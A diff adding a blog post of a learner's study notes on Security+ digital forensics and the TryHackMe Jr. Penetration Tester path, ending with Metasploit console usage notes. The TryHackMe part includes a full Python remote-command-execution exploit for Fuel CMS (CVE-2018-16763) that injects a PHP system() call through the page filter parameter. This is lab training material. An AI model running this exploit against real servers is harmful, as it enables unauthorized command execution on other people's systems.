@@ -1,0 +1,120 @@
+---
+title: 'ITPro.TV: CompTIA Security+ (SY0-601) &amp; TryHackMe: Jr. Penetration Tester'
+date: 2022-04-13 05:00:00.000000000 Z
+layout: post-external
+original_link: https://cardboard-iguana.com/log/2022-04-13-itprotv-comptia-security-plus-and-tryhackme-jr-penetration-tester.html
+author: 100007
+---
+
+<h1 id="itprotv-comptia-security-sy0-601--tryhackme-jr-penetration-tester">ITPro.TV: CompTIA Security+ (SY0-601) &amp; TryHackMe: Jr. Penetration Tester</h1>
+<p><strong>author:</strong> Nathan Acks<br />
+<strong>date:</strong> 2022-04-13</p>
+<h2 id="itprotv-comptia-security-sy0-601">ITPro.TV: CompTIA Security+ (SY0-601)</h2>
+<h3 id="digital-forensics-concepts">Digital Forensics Concepts</h3>
+<p>Order of volatility:</p>
+<ul>
+<li>CPU cache &amp; registers (good luck!)</li>
+<li>Routing tables, process tables, ARP cache, kernel stats</li>
+<li>(Non-Kernel) RAM</li>
+<li>Swap, /tmp, etc.</li>
+<li>Storage, VM snapshots</li>
+<li>Archival data, backups, logs, print-outs</li>
+</ul>
+<p>Preservation and documentation notes:</p>
+<ul>
+<li>Timestamp everything</li>
+<li>Note timezone differences</li>
+<li>Written reports and logs (also use these to establish the chain of custody)</li>
+<li>Witness testimony</li>
+<li>Use file hashes</li>
+</ul>
+<p>Chain of custody is often represented as a simple paper log/form.</p>
+<p>Tools of the trade:</p>
+<ul>
+<li>FTK Imager</li>
+<li>WinHex</li>
+<li>Autopsy</li>
+<li>EnCase Forensic</li>
+<li><code class="language-plaintext highlighter-rouge">dd</code></li>
+</ul>
+<h2 id="tryhackme-jr-penetration-tester">TryHackMe: Jr. Penetration Tester</h2>
+<h3 id="vulnerability-capstone">Vulnerability Capstone</h3>
+<p>I couldn’t get any of the exploits from Exploit DB to work for me, so I wound up doing a web search that landed me on a write-up for this room in GitHub; the provided exploit code is a little rough, but can be cleaned up to produce nice output without too much work:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="c1"># Derived from https://github.com/SlizBinksman/THM-Vulnerability_Capstone-CVE-2018-16763/blob/main/rce.py
+</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="nb">exit</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+<span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="n">error</span>
+<span class="n">delimeter1</span> <span class="o">=</span> <span class="s">'&lt;div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;"&gt;'</span>
+<span class="n">delimeter2</span> <span class="o">=</span> <span class="s">'&lt;/div&gt;'</span>
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">():</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+<span class="k">try</span><span class="p">:</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"
+[+] OS Command: "</span><span class="p">)</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">&#x007b;</span><span class="n">args</span><span class="p">.</span><span class="n">URL</span><span class="si">&#x007d;</span><span class="s">/fuel/pages/select/?filter='%2Bpi(%24a%3D('system'))%2B%24a('</span><span class="si">&#x007b;</span><span class="n">payload</span><span class="si">&#x007d;</span><span class="s">')%2B'"</span><span class="p">)</span>
+<span class="n">htmlText</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">,</span><span class="s">'html.parser'</span><span class="p">))</span>
+<span class="n">array1</span> <span class="o">=</span> <span class="n">htmlText</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="n">delimeter1</span><span class="p">)</span>
+<span class="n">array2</span> <span class="o">=</span> <span class="n">array1</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="n">delimeter2</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">'
+'</span> <span class="o">+</span> <span class="n">array2</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="s">'
+'</span><span class="p">,</span><span class="s">''</span><span class="p">))</span>
+<span class="k">except</span> <span class="n">error</span><span class="p">:</span>
+<span class="nb">exit</span><span class="p">(</span><span class="s">'
+[-] Could Not Connect To Server'</span><span class="p">)</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+<span class="n">mainArguments</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+<span class="n">mainArguments</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'URL'</span><span class="p">,</span><span class="n">help</span><span class="o">=</span><span class="s">'Target Website Hosting Vulnerable CMS'</span><span class="p">,</span><span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="p">)</span>
+<span class="n">args</span> <span class="o">=</span> <span class="n">mainArguments</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
+<span class="k">try</span><span class="p">:</span>
+<span class="n">exploit</span><span class="p">()</span>
+<span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
+<span class="nb">exit</span><span class="p">(</span><span class="s">'
+[!] Quitting'</span><span class="p">)</span>
+</code></pre></div></div>
+<ul>
+<li><a href="https://github.com/SlizBinksman/THM-Vulnerability_Capstone-CVE-2018-16763">THM-Vulnerability_Capstone-CVE-2018-16763</a></li>
+<li><a href="https://github.com/SlizBinksman/THM-Vulnerability_Capstone-CVE-2018-16763/blob/main/rce.py">THM-Vulnerability_Capstone-CVE-2018-16763 / rce.py</a></li>
+<li><a href="https://www.w3schools.com/python/ref_string_split.asp">Python String split() Method</a></li>
+<li><a href="https://stackoverflow.com/questions/54760850/replace-all-newline-characters-using-python">Replace all newline characters using python</a></li>
+</ul>
+<h3 id="main-components-of-metasploit">Main Components of Metasploit</h3>
+<p>Module categories:</p>
+<ul>
+<li>Auxiliary (odds-n-ends)</li>
+<li>Encoders (re-encode exploits to thwart signature-based anti-malware solutions)</li>
+<li>Evasion (attempt to directly evade anti-malware solutions)</li>
+<li>Exploits</li>
+<li>NOPS (no-op code that can be used to pad exploits to a needed size)</li>
+<li>Payloads (what you want to run if the exploit is successful; often, but not always, some kind of shell)</li>
+<li>Post (additional post-exploitation tools)</li>
+</ul>
+<p>Payloads, in turn, can be divided into:</p>
+<ul>
+<li>Singles (self-contained; also indicated by the use of an <code class="language-plaintext highlighter-rouge">_</code> separating “shell” from the rest of the payload name, as in <code class="language-plaintext highlighter-rouge">shell_reverse_tcp</code>)</li>
+<li>Stagers (small applications that establish a connection back to the attacker to download a larger, more complex payload)</li>
+<li>Stages (payloads designed to be downloaded by a stager; also indicated by the use of a <code class="language-plaintext highlighter-rouge">/</code> separating “shell” from the rest of the payload name, as in <code class="language-plaintext highlighter-rouge">shell/reverse_tcp</code>)</li>
+</ul>
+<h3 id="msfconsole">Msfconsole</h3>
+<p>You can use msfconsole as a shell, but there’s no redirect functionality.</p>
+<p>Use <code class="language-plaintext highlighter-rouge">history</code> to display a command history.</p>
+<p>All settings are scoped to the current module unless explicitly scoped globally (<code class="language-plaintext highlighter-rouge">set -g</code>).</p>
+<p>The <code class="language-plaintext highlighter-rouge">show</code> command can be used with any module type to list modules of that type, though Metasploit is a bit inconsistent about whether the type should be plural or not (<code class="language-plaintext highlighter-rouge">show auxiliary</code> vs. <code class="language-plaintext highlighter-rouge">show exploits</code>). When used in the context of a module, this usage of <code class="language-plaintext highlighter-rouge">show</code> will attempt to filter additional modules in a sensible way; for example, in the context of a Windows exploit, only Windows-based payloads will be shown.</p>
+<p>The <code class="language-plaintext highlighter-rouge">back</code> command leaves the context of the current module.</p>
+<p>Use <code class="language-plaintext highlighter-rouge">info</code> to get module information (which is not generally the same as “help”, though it often does contain useful informaiton).</p>
+<p>We can limit the <code class="language-plaintext highlighter-rouge">search</code> query to a particular type of module using the <code class="language-plaintext highlighter-rouge">type:</code> parameter (e.g., <code class="language-plaintext highlighter-rouge">search type:exploit wordpress</code>).</p>
+<h3 id="working-with-modules">Working with Modules</h3>
+<p>The common <code class="language-plaintext highlighter-rouge">RHOSTS</code> module option accepts IP addresses, ranges, CIDR networks, and even a file with one target per line (specify as <code class="language-plaintext highlighter-rouge">file:/path/to/file.txt</code>).</p>
+<p>Note that the <code class="language-plaintext highlighter-rouge">PAYLOAD</code> and <code class="language-plaintext highlighter-rouge">SESSION</code> parameters are not generally listed by <code class="language-plaintext highlighter-rouge">show options</code>, but can still be set if desired.</p>
+<p>You can reset individual parameters using <code class="language-plaintext highlighter-rouge">unset</code>, and reset the entire module using <code class="language-plaintext highlighter-rouge">unset all</code>.</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">set -g</code> = <code class="language-plaintext highlighter-rouge">setg</code></li>
+<li><code class="language-plaintext highlighter-rouge">unset -g</code> = <code class="language-plaintext highlighter-rouge">unsetg</code></li>
+<li><code class="language-plaintext highlighter-rouge">run</code> = <code class="language-plaintext highlighter-rouge">exploit</code></li>
+</ul>
+<p>Some exploit modules have a <code class="language-plaintext highlighter-rouge">check</code> option which attempts to determine if a target is vulnerable without actually exploiting it. Alternately, other modules have a paired auxiliary scanner. Many <em>don’t</em> have a check at all. YMMV!</p>
+<p>Meterpreter sessions can be backgrounded using the <code class="language-plaintext highlighter-rouge">background</code> command, and all sessions can be backgrounded using <code class="language-plaintext highlighter-rouge">CTRL + Z</code>. List sessions using the <code class="language-plaintext highlighter-rouge">sessions</code> command, and foreground a session using <code class="language-plaintext highlighter-rouge">session -i #</code>, where <code class="language-plaintext highlighter-rouge">#</code> is the session number.</p>
